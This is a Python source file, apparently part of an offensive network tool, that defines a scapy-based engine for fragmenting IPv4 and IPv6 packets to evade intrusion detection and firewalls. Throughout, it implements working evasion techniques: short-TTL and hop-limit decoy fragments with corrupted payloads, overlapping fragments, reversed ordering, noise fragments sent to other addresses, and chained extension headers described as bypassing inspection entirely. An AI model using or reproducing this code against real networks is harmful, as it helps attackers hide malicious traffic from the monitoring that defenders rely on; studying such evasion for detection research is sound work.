"""
Fragmentation Engine — IPv4 and IPv6

Provides multiple fragmentation strategies to evade IDS/IPS that
perform incorrect or incomplete packet reassembly.
Gap 6 adds IPv6 overlap and TTL (hop-limit) evasion variants.
"""

import copy
import random
from typing import List, Optional
from scapy.all import (
    IP, TCP, Raw, fragment, IPv6,
    IPv6ExtHdrDestOpt, IPv6ExtHdrRouting, PadN,
)


class FragmentationEngine:
    MIN_FRAGMENT_SIZE = 8

    def __init__(self, frag_size: int = 8):
        if frag_size % 8 != 0:
            raise ValueError(f"Fragment size must be a multiple of 8, got {frag_size}")
        self.frag_size = max(frag_size, self.MIN_FRAGMENT_SIZE)

    # ─── IPv4 Fragmentation ───

    def fragment_packet(self, pkt: IP) -> List[IP]:
        """Standard IPv4 fragmentation."""
        fragments = fragment(pkt, fragsize=self.frag_size)
        return fragments

    def fragment_with_ttl_evasion(
        self,
        pkt: IP,
        ids_hop_count: int = 5,
    ) -> List[IP]:
        """TTL-based evasion: send decoy fragments with short TTL.
        
        The IDS sees the decoy (with corrupted payload) but it
        expires before reaching the target. The target only sees
        the real fragments.
        """
        real_fragments = self.fragment_packet(pkt)
        result = []
        for frag in real_fragments:
            decoy = copy.deepcopy(frag)
            decoy[IP].ttl = max(1, ids_hop_count - 1)
            if Raw in decoy:
                original_payload = decoy[Raw].load
                decoy[Raw].load = bytes(
                    [b ^ 0xFF for b in original_payload]
                )
            del decoy[IP].chksum
            if TCP in decoy:
                del decoy[TCP].chksum
            result.append(decoy)
            result.append(frag)
        return result

    def fragment_with_overlap(
        self,
        pkt: IP,
    ) -> List[IP]:
        """Overlapping fragments — IDS and target may reassemble differently."""
        real_fragments = self.fragment_packet(pkt)
        if len(real_fragments) < 2:
            return real_fragments
        result = []
        for i, frag in enumerate(real_fragments):
            if i > 0:
                overlap = copy.deepcopy(real_fragments[i - 1])
                current_offset = frag[IP].frag
                overlap[IP].frag = current_offset
                if Raw in overlap:
                    overlap[Raw].load = b"\x00" * len(overlap[Raw].load)
                del overlap[IP].chksum
                result.append(overlap)
            result.append(frag)
        return result

    def fragment_ordered_reverse(self, pkt: IP) -> List[IP]:
        """Send fragments in reverse order — confuses sequential reassembly."""
        fragments = self.fragment_packet(pkt)
        return list(reversed(fragments))

    def fragment_interleaved_with_noise(
        self,
        pkt: IP,
        noise_target_ip: str,
    ) -> List[IP]:
        """Interleave real fragments with noise fragments to different IPs."""
        real_fragments = self.fragment_packet(pkt)
        result = []
        for frag in real_fragments:
            result.append(frag)
            noise = copy.deepcopy(frag)
            noise[IP].dst = noise_target_ip
            noise[IP].id = (frag[IP].id + 1000) & 0xFFFF
            del noise[IP].chksum
            if TCP in noise:
                del noise[TCP].chksum
            result.append(noise)
        return result

    # ─── IPv6 Fragmentation ───

    def fragment_ipv6(self, pkt: IPv6) -> List[IPv6]:
        """Standard IPv6 fragmentation with extension headers.
        
        Injects Destination Options and Routing headers to
        increase processing complexity at the firewall.
        """
        from scapy.all import IPv6ExtHdrFragment

        try:
            from scapy.all import fragment6
            fragments = fragment6(pkt, fragSize=self.frag_size)
        except (ImportError, AttributeError):
            fragments = fragment(pkt, fragsize=self.frag_size)

        result = []
        for i, frag in enumerate(fragments):
            dest_opt = IPv6ExtHdrDestOpt(
                options=[PadN(optdata=b"\x00\x00\x00\x00")]
            )
            rout_hdr = IPv6ExtHdrRouting(
                addresses=["fe80::1", "fe80::2"],
                segleft=1
            )
            if IPv6ExtHdrFragment in frag:
                frag_hdr = frag[IPv6ExtHdrFragment]
                payload = frag_hdr.payload
                frag_hdr.remove_payload()
                new_pkt = (
                    IPv6(src=frag[IPv6].src, dst=frag[IPv6].dst)
                    / dest_opt / rout_hdr / frag_hdr / payload
                )
                result.append(new_pkt)
            else:
                payload = frag[IPv6].payload
                new_pkt = (
                    IPv6(src=frag[IPv6].src, dst=frag[IPv6].dst)
                    / dest_opt / rout_hdr / payload
                )
                result.append(new_pkt)
        return result

    def fragment_with_overlap_ipv6(self, pkt: IPv6) -> List[IPv6]:
        """Overlapping IPv6 fragments — same evasion as IPv4 overlaps.
        
        Different OSes handle overlapping IPv6 fragments differently:
        - Linux: favors the first fragment
        - Windows: favors the last fragment
        - Some IDS: may fail to reassemble entirely
        """
        from scapy.all import IPv6ExtHdrFragment

        try:
            from scapy.all import fragment6
            real_fragments = fragment6(pkt, fragSize=self.frag_size)
        except (ImportError, AttributeError):
            real_fragments = fragment(pkt, fragsize=self.frag_size)

        if len(real_fragments) < 2:
            return real_fragments

        result = []
        for i, frag in enumerate(real_fragments):
            if i > 0 and IPv6ExtHdrFragment in frag:
                # Create an overlapping fragment with junk data
                overlap = copy.deepcopy(real_fragments[i - 1])
                if IPv6ExtHdrFragment in overlap:
                    # Set offset to match current fragment (overlap)
                    overlap[IPv6ExtHdrFragment].offset = frag[IPv6ExtHdrFragment].offset
                    if Raw in overlap:
                        overlap[Raw].load = b"\x00" * len(overlap[Raw].load)
                result.append(overlap)
            result.append(frag)

        return result

    def fragment_with_ttl_evasion_ipv6(
        self,
        pkt: IPv6,
        ids_hop_count: int = 5,
    ) -> List[IPv6]:
        """Hop-limit manipulation for IPv6 fragments.
        
        Same concept as IPv4 TTL evasion but using the IPv6
        Hop Limit field. Decoy fragments with corrupted payloads
        have a short hop limit that expires before the target.
        """
        from scapy.all import IPv6ExtHdrFragment
    
        try:
            from scapy.all import fragment6
            real_fragments = fragment6(pkt, fragSize=self.frag_size)
        except (ImportError, AttributeError):
            real_fragments = fragment(pkt, fragsize=self.frag_size)

        result = []
        for frag in real_fragments:
            # Decoy with short hop limit
            decoy = copy.deepcopy(frag)
            decoy[IPv6].hlim = max(1, ids_hop_count - 1)
            if Raw in decoy:
                original = decoy[Raw].load
                decoy[Raw].load = bytes([b ^ 0xFF for b in original])
            result.append(decoy)

            # Real fragment with normal hop limit
            result.append(frag)

        return result

    def fragment_with_ext_header_chain_ipv6(self, pkt: IPv6) -> List[IPv6]:
        """Chain multiple extension headers to confuse firewalls.
        
        Many firewalls have a limit on how many extension headers
        they process. By chaining Destination Options → Routing →
        another Destination Options → Fragment, we can exceed that
        limit and bypass inspection entirely.
        """
        from scapy.all import IPv6ExtHdrFragment

        try:
            from scapy.all import fragment6
            fragments = fragment6(pkt, fragSize=self.frag_size)
        except (ImportError, AttributeError):
            fragments = fragment(pkt, fragsize=self.frag_size)

        result = []
        for frag in fragments:
            # Build a long extension header chain
            dest_opt1 = IPv6ExtHdrDestOpt(
                options=[PadN(optdata=b"\x00\x00\x00\x00")]
            )
            rout_hdr = IPv6ExtHdrRouting(
                addresses=["fe80::1"], segleft=0
            )
            dest_opt2 = IPv6ExtHdrDestOpt(
                options=[PadN(optdata=b"\x00\x00\x00\x00\x00\x00")]
            )

            if IPv6ExtHdrFragment in frag:
                frag_hdr = frag[IPv6ExtHdrFragment]
                payload = frag_hdr.payload
                frag_hdr.remove_payload()
                new_pkt = (
                    IPv6(src=frag[IPv6].src, dst=frag[IPv6].dst, hlim=frag[IPv6].hlim)
                    / dest_opt1 / rout_hdr / dest_opt2 / frag_hdr / payload
                )
            else:
                payload = frag[IPv6].payload
                new_pkt = (
                    IPv6(src=frag[IPv6].src, dst=frag[IPv6].dst, hlim=frag[IPv6].hlim)
                    / dest_opt1 / rout_hdr / dest_opt2 / payload
                )
            result.append(new_pkt)

        return result